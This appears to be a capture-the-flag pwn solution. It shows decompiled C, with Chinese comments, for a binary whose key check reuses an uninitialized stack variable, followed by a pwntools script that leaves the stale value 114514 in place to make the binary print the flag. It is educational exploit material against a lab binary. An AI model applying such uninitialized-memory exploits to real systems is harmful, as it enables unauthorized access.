"""uninitialized_key rbp值相同，且未初始化, 造成覆盖
unsigned __int64 get_name()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF

  v1 = 0;
  puts("Please input your age:");
  __isoc99_scanf("%d", &v1);
  printf("Your age is %d.\n", v1);
}
unsigned __int64 get_key()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF

  __isoc99_scanf("%5d", &v1);
  if ( v1 == 114514 ) // 没有置0，会使用旧的值
  {
    puts("This is my flag.");
    system("cat flag");
  }
}
"""
from pwn import *
import re, warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level='debug', arch='amd64', os='linux')

s = process('./uninitialized_key')
gdb.attach(s, 'b*$rebase(0x000131e)\nc')

s.sendlineafter('age', '114514')
# s.sendlineafter('key:', p64(0x1BF52))
s.sendlineafter('key:', '\x00')

s.interactive()
